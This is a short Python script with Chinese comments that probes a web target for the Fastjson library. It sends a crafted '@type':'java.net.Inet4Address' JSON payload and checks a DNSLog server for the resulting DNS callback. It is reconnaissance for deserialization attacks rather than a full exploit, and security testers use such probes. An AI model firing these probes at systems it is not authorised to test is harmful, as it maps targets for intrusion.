import requests
import random
import json

class DnsLog():
    domain = ""
    token = ""
    Webserver = ""

    def __init__(self,domain,Webserver,token):
        self.domain = domain #dnslog的根域名
        self.Webserver = Webserver #dnslog的http监听地址，格式为 ip:端口
        self.token = token #token
        #检测DNSLog服务器是否正常
        try:
            res = requests.post("http://"+Webserver+"/api/verifyToken",json={"token":token}).json()
        except:
            exit("DnsLog 服务器连接失败")
        if res["Msg"] == "false":
            exit("DnsLog token 验证失败")
    
    #生成随机子域名
    def randomSubDomain(self,length = 5):
        subDomain = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba',length)) +'.'+ self.domain
        return subDomain

    #验证子域名是否存在
    def checkDomain(self,domain):
        res = requests.post("http://"+self.Webserver+"/api/verifyDns",json={"Query":domain},headers={"token":self.token}).json()
        if res["Msg"] == "false":
            return False
        else:
            return True

url = "http://192.168.41.2:8090/"


dns = DnsLog("test.com","1111:8888","admin")

subDomain = dns.randomSubDomain()

payload = {
    "b":{
        "@type":"java.net.Inet4Address",
        "val":subDomain
    }
}

requests.post(url,json=payload)

if dns.checkDomain(subDomain):
    print("存在FastJosn")
